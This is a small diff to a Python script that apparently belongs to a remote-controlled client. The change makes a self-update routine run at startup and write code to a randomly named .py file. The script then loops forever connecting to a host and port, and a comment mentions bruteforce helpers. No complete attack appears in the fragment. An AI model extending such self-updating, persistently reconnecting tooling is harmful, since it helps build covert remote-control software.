@@ -72,10 +72,7 @@ def repeat(obj, times=None):
 # Bruteforce Helper funcs END
 
 def selfUpdate():
-    while 1:
-        filename = "%d.py" % random.randint(1, 1000)
-        if not os.path.exists(filename):
-            break
+    filename = "%d.py" % random.randint(1, 1000)
 
     with open(filename, "w") as f:
         f.write(temporary)
@@ -450,7 +447,9 @@ def main(host, port):
                 print("[INFO] Connection Closed Due to Error:", ex,
                       "\n", __import__('traceback').print_exc())
                 break
+
 if __name__ == '__main__':
+    selfUpdate()
     while True:
         try:
             main(host, port)
